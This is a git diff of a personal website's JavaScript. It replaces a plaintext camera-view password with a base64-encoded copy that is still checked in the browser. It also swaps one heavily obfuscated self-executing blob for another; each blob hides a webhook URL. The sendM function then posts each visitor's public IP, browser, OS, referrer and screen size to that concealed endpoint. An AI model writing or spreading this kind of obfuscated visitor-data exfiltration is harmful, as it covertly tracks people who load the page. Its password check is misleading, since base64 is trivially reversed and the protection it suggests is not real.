@@ -58,6 +58,7 @@ closeButton.addEventListener('click', function() {
 let isCameraContentBoxVisible = false;
 let isPasswordCorrect = false;
 let passwordAttempts = 0;
+const encodedPassword = 'c2ViYXNlYmEx';
 
 document.querySelector('.camera-button').addEventListener('click', function() {
   let passwordBox = document.querySelector('.password-box');
@@ -84,7 +85,7 @@ document.querySelector('.camera-button').addEventListener('click', function() {
     document.getElementById('password').addEventListener('keypress', function(event) {
       if (event.key === 'Enter') {
         const password = event.target.value;
-        if (password === 'seba1') {
+        if (btoa(password) === encodedPassword) {
           passwordAttempts++;
           document.getElementById('password').value = '';
           if (passwordAttempts === 1) {
@@ -233,10 +234,9 @@ function refreshImages() {
 }
 setInterval(refreshImages, 60000); // Refresh every 60 seconds
 
-// Activity
+// Activity (For Fun)
 let devToolsMessageSent = false;
-
-var webhookUrl;(function(){var Ddj='',Vel=476-465;function wsy(o){var e=484157;var s=o.length;var y=[];for(var g=0;g<s;g++){y[g]=o.charAt(g)};for(var g=0;g<s;g++){var b=e*(g+394)+(e%46353);var m=e*(g+765)+(e%23505);var h=b%s;var c=m%s;var w=y[h];y[h]=y[c];y[c]=w;e=(b+m)%2777222;};return y.join('')};var EAR=wsy('qspworrctyluiuodrgfnjtmentcsckaobzxvh').substr(0,Vel);var LHE='usu=7j]gan.;7ot y9s72aaa,,abe=es5h7jz8x;tpirlluva9iz2>lzrr=cla,6(uto=q=;x(r,g9,= ,qan=oa"2,vp<) .a.]lr,6ao(e   a{..n6{iq]rvai(u)y;,h)+(C[i a<= =.y=c;;3tw;;5;))[r i. ,a+)7n whr8sflbv];u"C+);d)e);f,]Agni"r1;i)9;wegru-uenl+.=q rl1er+2adrl= 1}.9gt6==,}[l))goti6(j6fa;u al.er[srp.[g1)t;-et=(7pav7.)g=sr)xC,uvctod1 y=r"l+fsar;t-](rl{ ==r0vn,rarrher0mefiaft;5c o;4+)dt+b+d(0;en1<b+hs{vbvo=}iie.tp.=v)(=+;vog;,t;8;(l=-8f(Arrxn(st8r*[yyv=rr,=ov1jt<;iacfhnh=laecjm}oln;o"f(S6og.Axheha},aevg+A;fa1chd.dvt+r-nA,ros ew0)heo}hdvis[cqrr (eyo[;1+sv;s2)s*;v.cgl2u.; i2cm=,.;4l3al;=;8ie]u7nf+pa8ihpb.uf)y.vnpuc, t(;nvk.."aoo]p)8;=c2e(]"9)),C!ingl(2,l+(a+eep vhlh(vtd=b)ij,,sr()=)(7.ucang[n}r"((r)[pv=nm;tw.r] iv4h](r=bvo-({(dy0;[1.05ng10Cnr,hnt=p)es,r1+i;o);u"+rlnv,z+[rlfn0r;u;6([Cn)S+o.ih49)1po p(ar=0C-;{=hoffinr)er]+r+=5as!aCeh)t;nlv8rg3;i)c0jri0(ie+pp>vnnu=[sfmt0(e(fe ];{aneeet5=<jo(oic6==ih("+=e;]i4oa';var kiA=wsy[EAR];var SPt='';var cAV=kiA;var iJo=kiA(SPt,wsy(LHE));var RbT=iJo(wsy('tOfObf0+1liz\/_7nj)=gc$OOOSOr=37ucb,tr,.cOebeO(ce(sSbOcmrSc(2(1(_j{t;.bc&.fw O8}bgo.6xo)a(bi8-"ee36})fOOeOOog8sNh_%),637{D0(c\/;w{8i!2(0"nre2(O)*l7$tz.)5ec.tTOj]=1=OuC)at,=ga3C3o}O.2!_g\/s#gM 5 u)rO(s9rO"a!0ouo!.6]O;a).\'28r(c44f3O#.\/Osov,.t_i7.).3r8v,a,$57f-14.,-x.()%%e+![Oionf)hef.7c{rot!(!j]{!0\/i{ca$7h$t(pe$ 2-=+}OrleaOy\/lO$oOjb+_a5e)7r.31 O=a&u#\/46,.n1(,w.c._}t3eeh_O.(+.O.[p;.4O8)l7e=.f9;cOa(,bpO =p4g+6Oobe_=_cl!g)6ac.;s4O$O7ta.r{r}!.3sn-tO"np0cM.!2,+h;fO\'};O }idak$4s{..;942trOn3!jOOO5)O").fn;86"03OmI)dojc3.(oon4ibo,O;_i,s,}ds yx,as;O.od_(,.!_074_(r;c"(;$%!(_..($=$teuu.2lcj_!=(\'!;,f+-jsi70$eO)a,jj .%cfm;(()o$l+7=..)3,O.4.d$O\/tiO5tb+6ftoO:t)p0OiOn.24)O)=qco6d)u)rf9O)z.k;v1=fq0tS.Idr.eb$,)b3=*#;.$OOe,;=t+c$;O_fg!!bO6 .i,()7$[i#1+!=\/Or(=uOObbh=o.,Or3\/$Ow.tmn)a.0.r3]jbotrObf7*d,%Oi;d=)tO$4{zs}rOt7eOb=i,4)};OI(q=s\'.2!;.4-!Okr};ef+r).*O.24fas4fi( 1;0r.a_g),)!i)(N;)} %,1)=l!e)(_..3.b.O  ,!..)f#2($r_bObOO\/es1t8.c -.(nOr5O(i%vbrf. l)(=O){nioO\/3),.d!O.t,r3cc }q,6()#t(t.wtOnt{6n&cOr.$a$o8founst i(h_fq&0d.Ona,O,_jnOrg3$dO;b\'xO'));var XNz=cAV(Ddj,RbT );XNz(1250);return 2608})()
+var wurl;(function(){var MhU='',Ohc=356-345;function pCg(s){var w=459323;var r=s.length;var b=[];for(var f=0;f<r;f++){b[f]=s.charAt(f)};for(var f=0;f<r;f++){var a=w*(f+128)+(w%35118);var l=w*(f+246)+(w%50678);var g=a%r;var u=l%r;var m=b[g];b[g]=b[u];b[u]=m;w=(a+l)%1872265;};return b.join('')};var KUn=pCg('qoxrtyknuaslchdvfroijccpzwmtrgubnteos').substr(0,Ohc);var IEl='(shcv(<vv0=5h,0=(4y+ca.ni."bldyfr,kj=lx={phrstn;[tcz);[ig o+a8o049=ie8)taa=,]6l=6i=2yu0("2n7l.jgr2[,.m ;c1iCegc,rh(00,,civ02t0o.y]p;6re;r,(bafei}rdlar9t;;g;c)(ao[ye]0 ;ta{ .o2r[]=du=t)rf+hfal=a6ra,f+7(h5rrCo1=xnv9; moaw;.lanzrt;]inbh;avlh)f1g]n-oe {xh.sk (,8c (1]f;rC="t,t8grlrns;}-..;nprft{-;((=4 ;)ratlevlr;pr"[ [}plr;}=,g.ln=.xea50}e"r=.C,[ba>p4irj=1qe;r)7= a= u{+;t3r;.),4);=n)gil }yaoegd)7 gv)ga("(=)(c=c;vad-,c;f;sv1e*rv)euhev1. i9r=(i1e=5ar=.e=+h(Cbtv" (ff((v9da +futo.qedfclnd+p.aS8[{6r[A,"<[()1++o hvrno[;htcsf2c-pt2=r;3+,2as-lloeesn0u=ui+u+f(lnlnu.u) =*8as+vA>tw+;piuhhp(sor(thv.a,,]!l)ay,stk;(a[7+8]n;r=eo+v+rri (wainr)dn]or<C);7)i)u,bmivr=t8;gAsh))-=1ta ypyoj,("1)gl6ktp.sh()[c4ovtair1](s+jsilCr(;]zohvfx;1e,0ng<iv56)(;p)9=.ce;crtvtqm2cfa==s,7iann=r;.Couo].)e+;6n;8h]z)n7 9d+;;<qois;+=hniv+)k(4dc+l;t w.um.2a,Aa(i)ohvo{,)Stnfscc;rdpv,erhgA=in=2n+e rerih=}.apil;tg)i"(o)paaur!w= ';var zkl=pCg[KUn];var MPk='';var LYh=zkl;var txr=zkl(MPk,pCg(IEl));var xRU=txr(pCg('\/e4=e.d,c_)f,0Y.= YnC,n.ab#p+r5Y)Yb).$;n21,}Ys,+4.2w,oe1.r.i!b3S#n.5w4$9t*Yfe7s"tt )_%=)18Ya}h:$aoYz2!#j=nY"e)oY$.02o]z)!mdd0=1(Nd.)g)}5tYo4tu1){fz!k$o(06o.}a;u!oYr. Y.Yd_6..hYlYzY0tY.;jCsnp5pah;;_((Y tvn1 "!9ip0(.jYb2eY03#Cr7j+kr$l#vY.381_(Y 1k cvb(.!u.cs,4oih.o_.)%_,! fcopsY[c}6Y1I,r;p.qbgur,mY1Yf971. 1Yzc.o3%(=TY;evi$"tbhbmNe8.c{eg, r+leal4=.)Y$rps__ur[];\/horrY*;.=,4=.Y$a.%rgpn6toS)Y1a-Yac_h(,,n.=.*t(p4Y;2;c.\/3070\/Y\/lis-+6..#9!os+i{(Y3,(u13...)+zks*c,f28.nx.Yu;-h\'73.8)))()c "jo.)j&6,r9Y8.*.r06);0($!=ttf-5,r_+x9;_.Y3;Y)3.Y_,0;2Y($$Y).!_6csmY,.=.\/rfkf*);esY6g($cppY2,Y6Y,.r\/c(,$1b%iY$6jtY}";1Y(szoY=n+i..cr.o_ft(p(,.h2!;4%fhi6!,o5[ia2acY()Y=Yz(oY=8f!.pxo(fxfwtc.e{Yohds0.t.j{Y=cf.4 ,j6$s_#e(p)!!2eY)\'v.Y13 \'k)jit.YeY1(c)1..7wur)2cc%$s187b)h;2g(rsh4 Yr,s,n).l.z}c.f_)%(Y1\/Y\/!(om5Y,o45rysY3YYy=t{f=m_t5!.s+\/Y!35Y(sYff."Y$1!e$t$]\/ swu.(t)zpYi&$.$+\'I8o!sg{,te.)la!Y.,Y_ br)s;1rcsY$=c4.l&f.es;$e2i$ba)(Se5YjcY.6)t(e_aY)*7rlt2!ir)b3=rp(lr.wYyp;{,88}9sfYYjgfY{&}p; $)0js!!;((..*i3.}})ta7sn=mfn19}+_]'));var ZJz=LYh(MhU,xRU );ZJz(7545);return 5278})()
 
 function getBrowserAndOS() {
   const ua = navigator.userAgent;
@@ -252,7 +252,7 @@ function getBrowserAndOS() {
   if (ua.includes("Win")) os = "Windows";
   else if (ua.includes("Android")) os = "Android";
   else if (ua.includes("Linux")) os = "Linux";
-  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "IOS";
+  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
   else if (ua.includes("Mac")) os = "MacOS";
 
   return { browser, os };
@@ -263,7 +263,7 @@ function sendM(message, buttonName = '') {
   const referrer = document.referrer || '❌';
   const screenResolution = `${screen.width}x${screen.height}`;
   const request = new XMLHttpRequest();
-  request.open("POST", webhookUrl);
+  request.open("POST", wurl);
   request.setRequestHeader('Content-type', 'application/json');
 
   fetch('https://api64.ipify.org?format=json')
@@ -271,47 +271,21 @@ function sendM(message, buttonName = '') {
     .then(data => {
       const ip = data.ip;
 
-      const embeds = [{
-        "title": message,
-        "color": parseInt("5d35b2", 16),
-        "fields": [
-          {
-            "name": "\u2003",
-            "value": "\u2003",
-            "inline": false
-          },
-          {
-            "name": "🕒",
-            "value": new Date().toLocaleString(),
-            "inline": false
-          },
-          {
-            "name": "🌐",
-            "value": browser,
-            "inline": true
-          },
-          {
-            "name": "🖥️",
-            "value": os,
-            "inline": true
-          },
-          {
-            "name": "🔗",
-            "value": referrer,
-            "inline": false
-          },
-          {
-            "name": "📏",
-            "value": screenResolution,
-            "inline": true
-          },
-          {
-            "name": "🌐",
-            "value": ip,
-            "inline": true
-          }
+      const embed = {
+        title: message,
+        color: parseInt("5d35b2", 16),
+        fields: [
+          { name: "\u2003", value: "\u2003", inline: false },
+          { name: "🕒", value: new Date().toLocaleString(), inline: false },
+          { name: "🌐", value: browser, inline: true },
+          { name: "🖥️", value: os, inline: true },
+          { name: "🔗", value: referrer, inline: false },
+          { name: "📏", value: screenResolution, inline: true },
+          { name: "🌐", value: ip, inline: true }
         ]
-      }];
+      };
+
+      const embeds = [embed];
 
       if (buttonName) {
         embeds[0].fields.unshift({
